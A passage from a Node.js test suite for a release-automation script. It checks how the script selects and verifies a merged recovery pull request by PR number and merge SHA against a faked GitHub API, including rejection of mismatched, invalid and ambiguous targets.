          GITHUB_SHA: recoveryShaTwo,
          GITHUB_REF: `refs/heads/release-verify/${recoveryShaTwo}`,
          PR_NUMBER: '17',
        }),
      },
    );
    assert.equal(result.status, 0, result.stderr || result.stdout);
    const invocations = await readFile(fake.log, 'utf8');
    assert.match(invocations, /pulls\/17/);
    assert.doesNotMatch(invocations, /pulls\/7\n/);
    assert.doesNotMatch(invocations, /pulls\/9\n/);
  });

  it('selects one tagged recovery PR by matching both number and merge SHA', async () => {
    const taggedSeven = mergedPr(7, recoveryShaOne);
    const taggedNine = mergedPr(9, recoveryShaTwo);
    const fake = await makeReleaseCommandFake({
      list: [listedPr(taggedSeven), listedPr(taggedNine)],
      prByNumber: { 7: taggedSeven, 9: taggedNine },
    });
    const result = spawnSync(
      process.execPath,
      [path.resolve('scripts/release-automation.mjs'), 'verify-guard'],
      {
        cwd: path.resolve('.'),
        encoding: 'utf8',
        env: releaseCommandEnv(fake, {
          GITHUB_SHA: recoveryShaTwo,
          GITHUB_REF: `refs/heads/release-verify/${recoveryShaTwo}`,
          PR_NUMBER: '9',
        }),
      },
    );
    assert.equal(result.status, 0, result.stderr || result.stdout);
    const invocations = await readFile(fake.log, 'utf8');
    assert.match(invocations, /pulls\/9\n/);
    assert.doesNotMatch(invocations, /pulls\/7\n/);
  });

  it('rejects a PR number and merge SHA that point to different PRs', async () => {
    const taggedSeven = mergedPr(7, recoveryShaOne);
    const taggedNine = mergedPr(9, recoveryShaTwo);
    const fake = await makeReleaseCommandFake({
      list: [listedPr(taggedSeven), listedPr(taggedNine)],
      prByNumber: { 7: taggedSeven, 9: taggedNine },
    });
    const result = spawnSync(
      process.execPath,
      [path.resolve('scripts/release-automation.mjs'), 'verify-guard'],
      {
        cwd: path.resolve('.'),
        encoding: 'utf8',
        env: releaseCommandEnv(fake, {
          GITHUB_SHA: recoveryShaTwo,
          GITHUB_REF: `refs/heads/release-verify/${recoveryShaTwo}`,
          PR_NUMBER: '7',
        }),
      },
    );
    assert.notEqual(result.status, 0);
    assert.match(
      result.stderr,
      new RegExp(`PR #7 merge SHA ${recoveryShaOne} does not match requested ${recoveryShaTwo}`),
    );
  });

  it('rejects an invalid requested PR number instead of discovering another candidate', async () => {
    const taggedSeven = mergedPr(7, recoveryShaOne);
    const fake = await makeReleaseCommandFake({
      list: [listedPr(taggedSeven)],
      prByNumber: { 7: taggedSeven },
    });
    const result = spawnSync(
      process.execPath,
      [path.resolve('scripts/release-automation.mjs'), 'verify-guard'],
      {
        cwd: path.resolve('.'),
        encoding: 'utf8',
        env: releaseCommandEnv(fake, {
          GITHUB_SHA: recoveryShaOne,
          GITHUB_REF: `refs/heads/release-verify/${recoveryShaOne}`,
          PR_NUMBER: '999',
        }),
      },
    );
    assert.notEqual(result.status, 0);
    assert.match(result.stderr, /no canonical merged/);
  });

  it('fetches a SHA-only target whose list row omits merge_commit_sha', async () => {
    const taggedSeven = mergedPr(7, recoveryShaOne);
    const taggedNine = mergedPr(9, recoveryShaTwo);
    const fake = await makeReleaseCommandFake({
      list: [{ ...listedPr(taggedSeven), merge_commit_sha: undefined }, listedPr(taggedNine)],
      prByNumber: { 7: taggedSeven, 9: taggedNine },
    });
    const result = spawnSync(
      process.execPath,
      [path.resolve('scripts/release-automation.mjs'), 'verify-guard'],
      {
        cwd: path.resolve('.'),
        encoding: 'utf8',
        env: releaseCommandEnv(fake, {
          GITHUB_SHA: recoveryShaOne,
          GITHUB_REF: `refs/heads/release-verify/${recoveryShaOne}`,
          PR_NUMBER: '',
        }),
      },
    );
    assert.equal(result.status, 0, result.stderr || result.stdout);
    const invocations = await readFile(fake.log, 'utf8');
    assert.match(invocations, /pulls\/7\n/);
    assert.doesNotMatch(invocations, /pulls\/9\n/);
  });
  it('selects a SHA-only target when every listed row omits merge_commit_sha', async () => {
    const taggedSeven = mergedPr(7, recoveryShaOne);
    const taggedNine = mergedPr(9, mergeSha);
    const taggedSeventeen = mergedPr(17, recoveryShaTwo);
    const fake = await makeReleaseCommandFake({
      list: [
        { ...listedPr(taggedSeven), merge_commit_sha: undefined },
        { ...listedPr(taggedNine), merge_commit_sha: undefined },
        { ...listedPr(taggedSeventeen), merge_commit_sha: undefined },
      ],
      prByNumber: { 7: taggedSeven, 9: taggedNine, 17: taggedSeventeen },
    });
    const result = spawnSync(
      process.execPath,
      [path.resolve('scripts/release-automation.mjs'), 'verify-guard'],
      {
        cwd: path.resolve('.'),
        encoding: 'utf8',
        env: releaseCommandEnv(fake, {
          GITHUB_SHA: recoveryShaTwo,
          GITHUB_REF: `refs/heads/release-verify/${recoveryShaTwo}`,
          PR_NUMBER: '',
        }),
      },
    );
    assert.equal(result.status, 0, result.stderr || result.stdout);
    assert.match(await readFile(fake.log, 'utf8'), /pulls\/17\n/);
  });

  it('rejects ambiguous recovery when two PRs share the requested merge SHA', async () => {
    const taggedSeven = mergedPr(7, recoveryShaOne);
    const taggedNine = mergedPr(9, recoveryShaOne);
    const fake = await makeReleaseCommandFake({
      list: [listedPr(taggedSeven), listedPr(taggedNine)],
      prByNumber: { 7: taggedSeven, 9: taggedNine },
    });
    const result = spawnSync(
      process.execPath,
      [path.resolve('scripts/release-automation.mjs'), 'verify-guard'],
      {
        cwd: path.resolve('.'),
        encoding: 'utf8',
        env: releaseCommandEnv(fake, {
          GITHUB_SHA: recoveryShaOne,
          GITHUB_REF: `refs/heads/release-verify/${recoveryShaOne}`,
          PR_NUMBER: '',
        }),
      },
    );
    assert.notEqual(result.status, 0);
    assert.match(result.stderr, /expected one canonical merged/);
  });

  it('keeps unspecified pending discovery independent of unrelated tagged PRs', async () => {
    const taggedSeven = mergedPr(7, recoveryShaOne);
    const pendingSeventeen = mergedPr(17, recoveryShaTwo, 'autorelease: pending');
    const fake = await makeReleaseCommandFake({
      list: [listedPr(taggedSeven), listedPr(pendingSeventeen)],
      prByNumber: { 7: taggedSeven, 17: pendingSeventeen },
    });
    const result = spawnSync(
      process.execPath,
      [path.resolve('scripts/release-automation.mjs'), 'ensure-main'],
      {
        cwd: path.resolve('.'),
        encoding: 'utf8',
        env: releaseCommandEnv(fake, {
          FAKE_ALWAYS_MERGED: '1',
          FAKE_VERIFY_CREATE_SHA: recoveryShaTwo,
        }),
      },
    );
    assert.equal(result.status, 0, result.stderr || result.stdout);
    assert.match(await readFile(fake.log, 'utf8'), new RegExp(`sha=${recoveryShaTwo}`));
  });
});
